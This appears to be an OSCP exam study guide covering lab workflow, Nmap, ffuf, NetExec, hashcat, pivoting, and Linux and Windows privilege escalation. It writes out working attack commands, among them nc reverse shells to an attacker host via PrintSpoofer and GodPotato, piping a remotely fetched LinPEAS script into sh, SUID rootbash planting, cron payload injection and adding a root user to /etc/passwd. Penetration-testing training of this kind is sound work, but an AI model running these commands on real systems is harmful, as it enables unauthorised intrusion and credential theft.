docs.title: OSCP Practical Field Guide
docs.text:
Updated / 최종 수정: 2026-11-05

The working method

Question → smallest useful command → evidence → interpretation → next action. Choose a small set of tools you can explain and recover when they fail. Impacket matters greatly for Windows/AD, but cannot replace service enumeration, web testing, privilege analysis, routing or reporting.

Start with this page, then work through the Impacket handbook and reproducible tool lab. The existing subject pages retain deeper examples.

Exam-aware practice

Recheck the official Exam Guide before sitting the exam. No AI help during the exam, no spoofing/poisoning, no automatic exploitation or mass vulnerability scanners; commercial tools and Metasploit have restrictions. A tool's presence here is not blanket permission for every feature. See restricted tools. Use the commands only on assigned or authorised lab targets.

The scoring transition still applies by exam start time. From 1 December 2026 at 08:00 GMT, neither 70 nor 80 estimated raw points is a stopping rule. Work towards documented objectives, not a guessed scaled score.

docs.title: 1. Minimum toolkit and priorities
docs.text:
Priority / task Learn these first What you must demonstrate Detail Core: workspace / evidence Bash, tmux, script, tee, SHA-256 Recover a session, keep commands/output per host Reporting Core: service discovery Nmap, curl, dig, SMB client Full TCP coverage, focused service follow-up, hostname mapping Enumeration Core: web Burp Community Repeater, ffuf or feroxbuster, searchsploit Repeat a request, handle cookies, filter false positives, inspect a PoC Web Core: shell / transfer nc, Python HTTP server, curl, PowerShell, msfvenom Listener direction, stable shell, file integrity Shells Core: local privilege analysis Native Linux/Windows checks, LinPEAS, WinPEAS, pspy Explain the vulnerable permission, not just a coloured result Linux / Windows Core for AD NetExec, Impacket, Evil-WinRM Separate authentication, authorisation and execution Impacket AD graph / credentials BloodHound CE-compatible collector, hashcat or John Verify an edge and identify a hash format AD / Passwords Internal access Ligolo-ng, SSH forwards; Chisel as an alternative Explain target port vs callback port and route vs SOCKS Pivoting

You do not need to memorise three directory fuzzers or every Impacket example. Learn the primary tool and its fallback, plus why the first one failed.

docs.title: 2. Prepare a repeatable workspace
docs.text:
Use fictional training.test only in the lab. Replace the addresses and VPN interface with your actual assignment. Do not hard-code an old tun0 address into a payload.

mkdir -p ~/oscp-lab/{notes,nmap,web,loot,screens,tools}
cd ~/oscp-lab
export LAB_TARGET=10.10.20.21
export LAB_DOMAIN=training.test
export LAB_DC=10.10.20.10
export LAB_USER=learner
ip -4 addr
ip route get "$LAB_TARGET"
tmux new -s practice
# In a tmux pane, record this host's session; exit ends recording:
script -q -f notes/ms01-session.log

ip route get shows the route/interface chosen; it does not prove connectivity. In tmux: Ctrl-b c creates a window, Ctrl-b % splits, Ctrl-b d detaches, tmux attach -t practice reconnects. Keep one host per window. script records terminal control characters too, so clean it when preparing a report. Keep secret-bearing notes private and do not paste real credentials into public screenshots.

docs.title: 3. Nmap — coverage, then service questions
docs.text:
Question: which services can I reach, including high ports? Start with TCP connect scanning for a route/pivot-friendly baseline; use a SYN scan only when raw-packet access is available. Save results before touching the next host.

nmap -sT -Pn -n -p- -T3 -oA nmap/ms01-all "$LAB_TARGET"
# Replace these example ports with the ports actually found:
nmap -sT -Pn -n -sV -p 80,445,1433 -oA nmap/ms01-services "$LAB_TARGET"
# Select relevant scripts deliberately; scripts generate service requests:
nmap -sT -Pn -p 445 --script smb-os-discovery,smb2-security-mode   -oN nmap/ms01-smb.txt "$LAB_TARGET"
# Direct lab/VPN path with raw-packet permissions, not through proxychains:
# sudo nmap -sU -Pn --top-ports 20 -oA nmap/ms01-udp "$LAB_TARGET"
Option / result Interpretation -p- All 65,535 TCP ports, not UDP -Pn / -n Skip host discovery / reverse DNS; neither bypasses a firewall -sV / -oA Service fingerprinting / normal, XML and grepable output open A service responded; investigate its protocol filtered Filtering/no useful response; not proof the port is unused open\|filtered on UDP Common ambiguous result; send a protocol-specific probe

No open ports? Check assigned IP, route, VPN, timeouts and target health before an aggressive scan. A version banner is a clue, not proof a CVE applies. Next: HTTP → curl/Burp; SMB → share permissions; MSSQL → authentication. See deeper Nmap scenarios.

docs.title: 4. curl and ffuf — baseline before fuzzing
docs.text:
Question: is this the intended website and does an unknown path really return 404? Preserve redirects, cookies and the expected hostname. On your lab VM, add an assigned hostname to /etc/hosts if appropriate; --resolve below is a one-command alternative.

curl -i --max-time 10 "http://$LAB_TARGET/" | tee web/root.txt
curl -i --max-time 10 "http://$LAB_TARGET/not-a-real-path-7391" | tee web/missing.txt
# Hostname-specific HTTPS without changing global DNS:
# curl --resolve "portal.training.test:443:$LAB_TARGET" #   -i https://portal.training.test/
ffuf -u "http://$LAB_TARGET/FUZZ"   -w /usr/share/seclists/Discovery/Web-Content/common.txt   -mc all -ac -t 10 -rate 30 -of json -o web/paths.json
# Manual confirmation for an actual discovered path:
curl -i "http://$LAB_TARGET/admin/"

FUZZ marks the substituted field; -ac tries to calibrate wildcard responses; -mc all lets you inspect redirects and forbidden paths too. Calibration can hide useful results, so verify a known-good and known-missing path manually. If a site returns the same 200 page for everything, compare body size/words and cautiously filter that baseline (-fs, -fw, -fl). A 403 is a clue, not automatic access. A 301 may require the trailing slash or correct hostname. Avoid setting a huge rate over a fragile VPN. For virtual-host discovery, use -H 'Host: FUZZ.training.test' against the assigned IP and confirm any result manually.

docs.title: 5. Burp Community — a reproducible manual request
docs.text:
Use when: you need to change one request parameter and compare behaviour. Use Community Edition and manual tools; do not rely on Pro scanner results for this workflow.

# Reproduce an ordinary request independently of the GUI:
curl -i "http://$LAB_TARGET/search?q=alpha"
curl -i --get --data-urlencode 'q=alpha beta' "http://$LAB_TARGET/search"
# Add a current lab session cookie only if the page requires authentication:
# curl -i -H 'Cookie: session=<current-lab-cookie>' #   "http://$LAB_TARGET/search?q=alpha"
  1. Launch Burp Community with a temporary project; open Proxy → Open browser (the built-in browser avoids a separate proxy/certificate setup).
  2. Browse the assigned lab page. In Proxy → HTTP history, select the request and Send to Repeater.
  3. In Repeater, send the unchanged baseline first. Check scheme, host, port, method, cookies and body encoding.
  4. Change one value, send again, and compare status, response length and meaningful content. A 500 is not proof of SQL injection; record a controlled true/false difference or another repeatable effect.
  5. If redirected to login, refresh the session and CSRF token before drawing conclusions. For HTTPS, trust the lab CA in the intended browser instead of globally disabling TLS validation.
  6. Save the exact baseline and modified raw requests, responses and interpretation. Link the behaviour to manual SQLi / upload / LFI.

The image below is a real local HTTP transaction, not a Burp GUI screenshot. It teaches the same method/path/status/header/body fields; reproduce the GUI steps in your own Burp lab.

docs.title: 6. NetExec and Evil-WinRM — validate once, then connect
docs.text:
Question: is the credential valid on this protocol, and does it authorise the action I want? Start with one host and one known credential, not a subnet-wide password loop. Read lockout policy before any password-spraying exercise.

nxc smb "$LAB_TARGET" -d "$LAB_DOMAIN" -u "$LAB_USER" -p 'LabOnly-123!'
nxc smb "$LAB_TARGET" -d "$LAB_DOMAIN" -u "$LAB_USER" -p 'LabOnly-123!' --shares
nxc smb "$LAB_DC" -d "$LAB_DOMAIN" -u "$LAB_USER" -p 'LabOnly-123!' --pass-pol
# Domain user versus a known local account are different validations:
# nxc smb "$LAB_TARGET" --local-auth -u labadmin -p 'LocalLabOnly-123!'
evil-winrm -i "$LAB_TARGET" -u "$LAB_USER" -p 'LabOnly-123!'
# In Evil-WinRM PowerShell:
# whoami /all
# hostname
# ipconfig
# upload /home/kali/oscp-lab/tools/winPEASx64.exe C:\Windows\Temp\winPEASx64.exe

The passwords shown are deliberately fictional lab values. nxc output indicating administrative access depends on the protocol/module/version; confirm actual capabilities. WinRM requires its service, firewall and account rights (often Remote Management Users or administrators). An SMB success does not imply WinRM success. If authentication fails, check domain/local scope and stop to diagnose; repeated guesses can lock an account. See AD tools.

docs.title: 7. Hashcat / John — identify the input first
docs.text:
Use offline cracking for lab material you have obtained. The hash prefix and encryption type decide the mode; the tool that collected it does not. Do not feed the entire secretsdump log to every cracking mode.

# Examples: select the one matching YOUR input, not all of them.
hashcat -m 1000 loot/nt-only.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 loot/tgs-rc4.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 loot/asrep-rc4.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 loot/netntlmv2.txt /usr/share/wordlists/rockyou.txt
# Review an already-run job:
hashcat -m 1000 loot/nt-only.txt --show
# John Jumbo alternative for a file containing NT hashes:
# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt loot/nt-only.txt
# john --show --format=NT loot/nt-only.txt
Input Typical mode Raw NT hash, 32 hex characters 1000 $krb5tgs$23$ / $krb5tgs$18$ 13100 / 19700 $krb5asrep$23$ 18200 NetNTLMv2 challenge-response 5600

These modes are examples for the shown formats; check hashcat --help / --example-hashes for your installed version. Exhausted means that candidate set finished, not that the account is uncrackable. Token length exception usually means the wrong format/mode or damaged input. Avoid --force as a generic fix. Limit time, preserve the original hash, then use --show to retrieve the result. A recovered password must still be validated for the intended account.

docs.title: 8. Listener, transfer and shell stability
docs.text:
A callback goes target → attacker listener. A download goes target → attacker web/SMB server. Both require the target to reach the advertised address; the attacker's default Ethernet address may be wrong on a VPN.

# Pane 1: reserve a listener for your authorised lab shell payload.
nc -lvnp 4444
# Pane 2: serve only staged files, bound to the reachable lab interface.
# Replace the sample address with the actual reachable address first:
python3 -m http.server 8000 --bind 10.10.14.5 --directory ~/oscp-lab/tools
# Linux target:
# curl -f http://10.10.14.5:8000/linpeas.sh -o /tmp/linpeas.sh
# sha256sum /tmp/linpeas.sh
# Windows target PowerShell:
# Invoke-WebRequest http://10.10.14.5:8000/winPEASx64.exe -OutFile C:\Windows\Temp\winPEASx64.exe
# Get-FileHash C:\Windows\Temp\winPEASx64.exe -Algorithm SHA256

For a basic Linux shell: run python3 -c 'import pty; pty.spawn("/bin/bash")' on the target; suspend with Ctrl-Z, run stty raw -echo; fg in the local terminal, then set TERM=xterm on the target. If your terminal becomes unusable, open another terminal and recover with stty sane. Do not perform those local terminal settings inside Windows PowerShell. A connection without a working prompt may be the wrong payload/architecture or blocked command execution. See payload and shell detail.

docs.title: 9. Privilege escalation — verify the finding
docs.text:
Start with native checks; then use a helper to cover omissions. A red line from PEAS is an investigation lead. Keep the exact permission, owner, executable path and trigger that make the issue exploitable.

# Linux target:
id; hostname; uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
# After verifying transfer integrity:
# bash /tmp/linpeas.sh | tee /tmp/linpeas-results.txt
# ./pspy64   # observe a short lab interval, then Ctrl-C
# Windows target (PowerShell):
# whoami /all
# Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName,State
# icacls C:\Path\To\Candidate.exe
# .\winPEASx64.exe

Linux: sudo -l → allowed command and arguments; SUID → owner and reachable execution path; capabilities → which binary has which capability; cron/pspy → actual recurring command and writeable dependency. Look up only a matching GTFOBins entry, not a random shell escape.

Windows: confirm token privilege and service/OS context before choosing an impersonation technique. An unquoted service path needs a writable candidate path and a realistic service restart trigger. A writable file is useful only if a more privileged process actually loads it. Do not apply an exploit just because WinPEAS prints its name. Kernel exploits come after reproducible configuration paths. Follow Linux / Windows for worked cases.

docs.title: 10. AD — turn the credential into a verified path
docs.text:
Use Impacket sections 4–12 for the detailed command decisions. Use a BloodHound collector that matches Community Edition, then treat graph edges as hypotheses that need verification.

# Kali collector; enter the lab password when prompted:
bloodhound-ce-python -u "$LAB_USER" -d "$LAB_DOMAIN" -ns "$LAB_DC" -c All --zip
# Or on a domain lab host, with an installed SharpHound release compatible with your CE:
# .\SharpHound.exe -c All --ZipFileName collection.zip

Import the ZIP through the CE interface. Find the starting user, inspect its group memberships and the next reachable object, then confirm each edge's help text and prerequisites. GenericAll, WriteDACL, AdminTo, session edges and replication rights are different things. Some edges may be stale or blocked by network/firewall conditions. -c All requests broad collection; if it fails, inspect DNS, credentials, LDAP/RPC connectivity and reduce collection to what is reachable rather than assuming the graph is empty. Each new credential goes into a table: identity, domain/local scope, origin, tested host/protocol, verified rights. The AD chapter provides the wider chain.

docs.title: 11. Pivot — prove one service before scanning a subnet
docs.text:
Distinguish a layer-3 route from an application SOCKS proxy. Ligolo-ng presents a routed interface but translates supported traffic through the agent; raw SYN/ICMP assumptions may not hold. Use -sT -Pn -n when testing through the tunnel. UI commands vary by Ligolo-ng release; the manual-route pattern below keeps the network decisions visible.

# Kali: one-time TUN setup (requires network administration capability):
sudo ip tuntap add user "$(id -un)" mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# On the authorised pivot host, after verifying the displayed proxy certificate fingerprint:
# .\agent.exe -connect 10.10.14.5:11601 -accept-fingerprint <displayed-fingerprint>
# In the proxy console: certificate_fingerprint; session; select the agent
# Then: tunnel_start --tun ligolo
# Kali, using a lab subnet that does NOT overlap the VPN route:
sudo ip route add 10.10.30.0/24 dev ligolo
ip route get 10.10.30.10
nmap -sT -Pn -n -p 445,5985 10.10.30.10
# After the exercise, remove only the route/interface you created:
# sudo ip route del 10.10.30.0/24 dev ligolo
# sudo ip link del ligolo

If one TCP connection fails, inspect the active agent, selected session, route, interface, destination firewall and return path. Do not scan a whole range until that works. A reverse shell from the internal host may need an agent listener/forward as well; being able to connect to SMB does not prove the internal host can call back to Kali. If you only need one SQL port and already have SSH access, a local forward can be simpler: ssh -N -L 127.0.0.1:11433:10.10.30.10:1433 user@pivot then connect with mssqlclient -port 11433 ...@127.0.0.1; remember Kerberos still requires the correct service identity. See pivoting.

docs.title: 12. Evidence and completion criteria
docs.text:
For each target record: initial identity, service/version, exact request or command, returned evidence, privilege transition, target IP, original proof path and reproduction steps. Capture the proof with cat or type from the target's interactive shell, not from a copied file or web shell. Follow the exact proof rules and report checklist.

A practice run is complete when you can:

  • Explain why the chosen tool fits the observed service and rights.
  • Reproduce the path from clean notes without a walkthrough.
  • Diagnose one deliberate error: wrong hostname, port, auth scope or route.
  • Compare transferred file hashes and show the target identity/IP with proof.
  • Write a short report another learner can repeat.

docs.title: 13. What the images prove
docs.text: The images are faithful renderings of captured terminal output, not stock images or fabricated AD success screens. Local HTTP discovery/fuzzing and authenticated SMB transfer were executed against loopback services. Impacket help captures verify executable/version/options only. Windows, domain, BloodHound, Burp GUI and Ligolo-ng procedures require your own lab and are not claimed as end-to-end tested here. Full raw logs, provenance and the local reproducer are under scripts/oscp-captures/ in the repository. Click an image to enlarge; text commands remain available beside it.

docs.title: Practice Labs & Machine Lists
docs.text:
Section: OSCP+ · Last updated: 2026-10-23

In one sentence

PEN-200 Challenge Labs first, then OffSec's own Proving Grounds machines — the boxes closest to the exam style — worked through a current machine list, with timed mock exams at the end.

How this page is organised

A practice plan plus a progress log to fill in. The consistent advice from 2025–2026 write-ups: volume of machines matters, but only if you understand each one — don't just chase the flag.

docs.title: Order of practice
docs.text:
1. PEN-200 course + Challenge Labs — build the methodology on the official material.
  2. Proving Grounds Practice — the closest thing to exam machines (OffSec-built, retired exam labs live here).
  3. A current machine list (LainKusanagi) across PG / HTB — breadth and pattern recognition.
  4. AD-specific drills — because the AD set is where people fail.
  5. Timed mock exams — full dress rehearsals, including the report.

docs.title: PEN-200 & Challenge Labs
docs.text:
• Work the course modules up to and including Assembling the Pieces.
  • OSCP A, B and C are the three Challenge Labs with a full AD set under the assumed-breach model — the single best exam proxy. Clear them and understand them 100%; if they feel comfortable, you're close to ready.
  • Secura, Medtech and Relia are good additional multi-machine labs.

docs.title: Proving Grounds Practice
docs.text:
• Paid tier (~$19/month) with Windows and Linux boxes, including retired OSCP exam labs.
  • OffSec builds these, so they train you in OffSec's style and rabbit-hole design — often cited as more exam-relevant than HTB.
  • Most passers report doing roughly 40–70 machines across their whole prep.

docs.title: Machine lists
docs.text:
• LainKusanagi's OSCP-like list — the current favourite; filters out boxes outside PEN-200/OSCP scope and is kept updated. Community forks add difficulty ratings and a study tracker.
  • TJ Null's list — the long-standing list, now considered somewhat dated for the current exam.
  • Use a list as a spine, not a checklist to rush — a box you understood beats three you flagged with a walkthrough open.

docs.title: AD practice
docs.text:
The AD set is 40 points and the #1 failure area, so drill it specifically:

  • Challenge Labs OSCP A/B/C (assumed-breach AD).
  • HTB / dedicated AD rooms for Kerberos, lateral movement, pivoting.
  • Hacker Blueprint and similar AD-focused drills come up often in pass write-ups.

Study side for every AD technique: Active Directory.

docs.title: Mock exams
docs.text:
Treat these like the real thing — they are where you practise the parts that aren't hacking:

  • 3 standalones + 1 AD set, self-selected, in a 24-hour window.
  • Write the full report afterwards, to the real requirements → Reporting. Do this at least three times; by exam day the report should be mostly mechanical.
  • Rehearse the logistics: start time, breaks, proof screenshots, point tracking.

docs.title: Walkthroughs — how to use them
docs.text:
• Try the box fully first; only open a walkthrough once you've genuinely exhausted your own ideas.
  • Afterwards, read an official writeup / IppSec video even if you passed — to pick up methodology, not just the answer.
  • ippsec.rocks searches IppSec videos by technique/keyword — useful when stuck on a type of vuln.

docs.title: Linux Privilege Escalation
docs.text:
Exam weight: 10 points per Linux standalone (proof.txt) · Last updated: 2026-11-03

In one sentence

Low-privilege shell to root: enumerate thoroughly first, work the common misconfigurations in order (sudo → SUID / capabilities → cron → credentials → services), and keep kernel exploits for last.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: 1. Concept
docs.text:
Root on a Linux box comes from one of a few places:

Source Why it works Something runs as root that you can influence sudo rule, SUID binary, capability, root cron job, root service, writable script / PATH / library A credential you can find Config files, history, backups, database tables, SSH keys — reused for root or another user A misconfigured share or group NFS no_root_squash, membership in docker / lxd / disk / adm A vulnerable kernel or SUID package PwnKit, DirtyPipe, old sudo — last resort

Often it is two hops: www-data → a real user (found credential) → root (sudo rule).

docs.title: 0. Stabilise the shell first
docs.text:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm

Full detail → Shells & file transfer › TTY upgrade.

docs.title: 2. Main tools
docs.text: Tool Use it for Exam status LinPEAS Broad automated enumeration, colour-coded Allowed pspy Watching processes (cron jobs, root scripts) without root Allowed GTFOBins How to abuse a sudo / SUID / capability binary Allowed (reference site) searchsploit Kernel / package exploit lookup Allowed Manual commands sudo -l, find, getcap, ss, ps —

docs.title: 3.1 First five minutes — manual checks
docs.text:
id; hostname; ip a
sudo -l                                   # needs the user's password? try any you found
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron 2>/dev/null
ss -tulpn                                  # local-only services (127.0.0.1)
ps aux --forest | grep -v '\]$'           # what runs as root?
ls -la /home/* /opt /var/backups /var/www 2>/dev/null
uname -a; cat /etc/os-release

What to read: any (root) NOPASSWD: in sudo -l; a SUID binary not in the standard list (/usr/bin/passwd, mount, su, sudo, … are normal — /usr/bin/find, /opt/backup, python3 are not); a capability like cap_setuid+ep; groups such as docker, lxd, disk.

docs.title: 3.2 LinPEAS — broad sweep
docs.text:
Situation: The manual checks didn't show an obvious path.

# Kali: python3 -m http.server 80
curl http://<KALI>/linpeas.sh | sh | tee /tmp/lp.txt
# or download, chmod +x, run

What to read: red-on-yellow = "95% a privesc vector"; red = worth checking. Focus on: Sudo version, SUID, Capabilities, Cron jobs, Writable files owned by root, Interesting files (passwords in configs), Active ports, Users with console.

Next: each highlighted item → GTFOBins or the matching scenario below. Don't trust the CVE suggestions blindly — they are guesses based on version numbers.

docs.title: 3.3 sudo rule → GTFOBins
docs.text:
Situation: sudo -l shows e.g. (root) NOPASSWD: /usr/bin/find.

Look up the binary on GTFOBins → section Sudo:

sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Variations to check:

  • A script you can run as root (sudo /opt/backup.sh) → can you write the script, or a file / command it calls without a full path?
  • env_keep+=LD_PRELOAD in sudo -l → build a tiny shared library that spawns a shell and preload it.
  • Wildcards in the allowed command (/usr/bin/cat /var/log/*) → path traversal (/var/log/../../etc/shadow).
  • Old sudo version (sudo -V) → known CVEs (e.g. Baron Samedit, CVE-2021-3156) as a later option.

docs.title: 3.4 SUID / capabilities → GTFOBins
docs.text:
Situation: find / -perm -4000 shows /usr/bin/python3.8 or getcap shows cap_setuid+ep.

# SUID binary (GTFOBins → "SUID" section — note the -p to keep privileges)
/usr/bin/find . -exec /bin/sh -p \; -quit
# cap_setuid on python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Custom SUID binary (/usr/local/bin/backup): run strings on it — does it call tar, cp, service without a full path? Then hijack PATH:

echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar; chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup

docs.title: 3.5 Cron jobs and hidden root processes — pspy
docs.text:
Situation: Nothing in /etc/crontab, but something feels scheduled (a log file that keeps updating, a /opt/scripts folder).

# upload pspy64, then
chmod +x /tmp/pspy64; /tmp/pspy64 -pf -i 1000

What to read: lines with UID=0 that repeat every minute — e.g. UID=0 PID=2345 | /bin/sh -c /opt/scripts/cleanup.sh or tar czf /backups/web.tgz *.

Next:

  • Writable script → append a payload: 
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
# wait one cycle, then
/tmp/rootbash -p
  • Wildcard with tar in a directory you can write: 
    cd /var/www/html
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
  • Script calls a binary by name and the cron PATH includes a directory you can write → plant a binary of that name.

docs.title: 3.6 Credentials on the box
docs.text:
Privilege escalation is often just credential reuse:

cat ~/.bash_history ~/.*_history 2>/dev/null
grep -rniE 'pass(word)?\s*[=:]|DB_PASS|secret' /var/www /opt /etc /home 2>/dev/null | grep -v '^Binary'
find / -name '*.bak' -o -name '*.old' -o -name '*.kdbx' -o -name 'id_rsa*' 2>/dev/null
cat /var/www/*/wp-config.php /var/www/*/config*.php 2>/dev/null

What to read: DB passwords (try them for su root, su <user>, and SSH), private keys, .git directories (history), mail in /var/mail.

Next: su - with each password; log in to the database and read its user table → Password attacks.

docs.title: 3.7 Internal services
docs.text:
Situation: ss -tulpn shows 127.0.0.1:8080 or 127.0.0.1:3306 that nmap couldn't see.

Forward it to Kali and attack it like a new target:

# you have SSH as the user
ssh -L 8080:127.0.0.1:8080 user@$IP
# no SSH: chisel reverse port forward
./chisel client <KALI>:8000 R:8080:127.0.0.1:8080     # Kali: ./chisel server -p 8000 --reverse

Then browse http://127.0.0.1:8080 on Kali. A root-run internal web app (admin panel, Jenkins, a dev API) is a frequent intended path. More → Pivoting.

docs.title: 3.8 Groups: docker / lxd / disk / adm
docs.text: Group (from id) Path to root docker docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxd / lxc Import a small image, create a privileged container with / mounted disk debugfs /dev/sda1 → read /root/.ssh/id_rsa or /etc/shadow adm Read logs in /var/log — credentials in auth / app logs

docs.title: 3.9 NFS no_root_squash
docs.text:
Situation: cat /etc/exports (or showmount -e from Kali) shows /srv/share *(rw,no_root_squash).

# Kali, as root
sudo mount -t nfs -o vers=3 $IP:/srv/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod +s /mnt/nfs/rootbash
# target
/srv/share/rootbash -p

(Copy a bash binary compatible with the target if Kali's is newer than the target's libc.)

docs.title: 3.10 Writable /etc/passwd or /etc/shadow
docs.text:
ls -l /etc/passwd /etc/shadow
openssl passwd -1 'Pwned123'                     # → $1$...
echo 'r00t:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t

docs.title: 3.11 Kernel exploits — last resort
docs.text:
uname -r; cat /etc/os-release; dpkg -l | grep -i polkit   # PwnKit check
searchsploit linux kernel 4.4 privilege escalation

Common candidates: PwnKit (CVE-2021-4034, polkit pkexec), DirtyPipe (CVE-2022-0847, kernel 5.8–5.16.x), DirtyCow (old kernels). Compile on a matching system or use a static build; read the exploit first — a kernel panic costs a revert.

docs.title: 4. Common mistakes
docs.text:
• Running LinPEAS and reading only the CVE list. The intended path is usually a sudo rule, a cron job or a credential in the same output.
  • Skipping sudo -l because it asks for a password — try every password you've found.
  • Not using pspy. Root cron jobs in a user's crontab don't show in /etc/crontab.
  • Forgetting -p with SUID bash / sh — without it the shell drops privileges.
  • Jumping to kernel exploits first and crashing the box.
  • Missing a second user. www-data → user (password in config) → root is very common.

docs.title: 5. Exam tips
docs.text:
• Proof screenshot: cat /root/proof.txt, whoami, ip a in one screenshot from an interactive shell (flag rules).
  • Time-box: 30 min on manual checks + LinPEAS + pspy; if still nothing, re-read the output from the top — then look for internal services.
  • Keep a personal list of the GTFOBins entries you used; it gets reused a lot.

docs.title: Checklist
docs.text:
• Shell upgraded to a proper TTY
  • sudo -l checked (with every known password) → GTFOBins
  • SUID + capabilities enumerated → GTFOBins
  • Cron read and pspy run (writable scripts? wildcards?)
  • Config files / history / backups / SSH keys searched for credentials
  • Local-only services found and forwarded
  • Groups (docker, lxd, disk) and NFS exports checked
  • Kernel / distro version noted (kept as the last option)

  • Defender view: Linux auth & history · Linux persistence · Linux logs & triage
  • Linux commands · Methodology & habits

docs.text:

  • PEASS-ng (LinPEAS)

docs.title: Windows Privilege Escalation
docs.text:
Exam weight: 10 points per Windows standalone (proof.txt) + AD-set hosts · Last updated: 2026-11-03

In one sentence

Low-privilege user to Administrator / SYSTEM: read your token privileges first (SeImpersonate → potato), run WinPEAS, then work services, scheduled tasks, stored credentials and installer policies — kernel exploits last.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: 1. Concept
docs.text: Source Why it works Token privileges Service accounts (IIS, MSSQL) hold SeImpersonatePrivilege; SeBackup / SeRestore / SeManageVolume / SeDebug each have a known abuse Something runs as SYSTEM that you can influence Service binary / path / permissions, scheduled task target, DLL search path, AlwaysInstallElevated Stored credentials Saved creds, PowerShell history, unattend files, config files, auto-logon, KeePass Group membership Backup Operators, Server Operators, DnsAdmins, local Administrators behind UAC Missing patches Old builds with known local exploits — last resort

docs.title: 2. Main tools
docs.text: Tool Use it for Exam status WinPEAS Broad automated enumeration Allowed PrivescCheck.ps1 / SharpUp Second opinion on services / tasks / registry Allowed PrintSpoofer SeImpersonate → SYSTEM via the print spooler named pipe Allowed GodPotato (and other potatoes) SeImpersonate → SYSTEM via DCOM / RPC, works on newer builds Allowed mimikatz Dump credentials once you are admin / SYSTEM Allowed → AD › mimikatz LOLBAS Built-in binaries for download, execution, bypasses Allowed (reference site) msfvenom Replacement service binaries, DLLs, MSIs Allowed everywhere

docs.title: 3.1 First five minutes — manual checks
docs.text:
whoami /priv                 # token privileges — read this first
whoami /groups               # groups + integrity level (Medium / High)
systeminfo                   # OS build, hotfixes, architecture
net user; net localgroup administrators
ipconfig /all                # second NIC? → pivot
netstat -ano | findstr LISTENING   # local-only services
Get-ChildItem C:\Users\ -Force; dir C:\ -Force   # odd folders: C:\backup, C:\scripts, C:\inetpub

What to read:

  • SeImpersonatePrivilege Enabled or SeAssignPrimaryTokenPrivilege → potato, now.
  • SeBackupPrivilege → dump SAM/SYSTEM.
  • Mandatory Label\Medium while in Administrators → you are admin behind UAC → UAC.
  • Non-default folders in C:\ or Program Files → custom software, often the intended path.

docs.title: 3.2 WinPEAS — broad sweep
docs.text:
iwr http://<KALI>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe | Tee-Object C:\Windows\Temp\wp.txt

What to read: red highlights in Services Information (modifiable service, unquoted path), Applications Information (writable install dirs), Scheduled tasks, Interesting files and registry (AutoLogon, unattend.xml, PuTTY / WinSCP sessions), PowerShell history, AlwaysInstallElevated.

If the .exe is blocked, try the .bat version or PrivescCheck.ps1:

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"

docs.title: 3.3 SeImpersonatePrivilege → PrintSpoofer / GodPotato
docs.text:
Situation: A shell as iis apppool\..., nt service\mssqlserver, a web shell, or xp_cmdshell — and whoami /priv shows SeImpersonatePrivilege.

# PrintSpoofer — needs the Print Spooler running (common on Server 2016/2019, Win10)
.\PrintSpoofer64.exe -i -c cmd                                         # interactive
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"      # non-interactive shell

# GodPotato — no spooler needed; pick the build matching the .NET version
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"

What to read: nt authority\system from whoami. PrintSpoofer says [-] Operation failed / no pipe → spooler is off → try GodPotato (or another potato: SweetPotato, JuicyPotatoNG). From a web shell the -i interactive mode won't work — always send a reverse shell.

Next: grab proof.txt, then loot (mimikatz / SAM) before moving on → AD › Looting.

Defender view and the mechanism: Token Impersonation / Potato · PrintNightmare.

docs.title: 3.4 SeBackupPrivilege / Backup Operators
docs.text:
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# download both (evil-winrm: download ...), then on Kali:
impacket-secretsdump -sam sam.save -system system.save LOCAL

Next: pass the local Administrator NT hash → evil-winrm -i $IP -u Administrator -H <NT>. On a DC, the same privilege can copy NTDS.dit (via a shadow copy) → SAM / NTDS Extraction.

docs.title: 3.5 Service misconfigurations
docs.text:
Situation: WinPEAS flags a service, or you see a custom service in C:\Program Files\<Vendor>.

Get-CimInstance Win32_Service | ? {$_.StartName -like '*LocalSystem*'} | select Name,State,PathName,StartMode
sc.exe qc <svc>
icacls "C:\Program Files\Vendor\svc.exe"          # (F) or (M) for Users / Everyone / you?
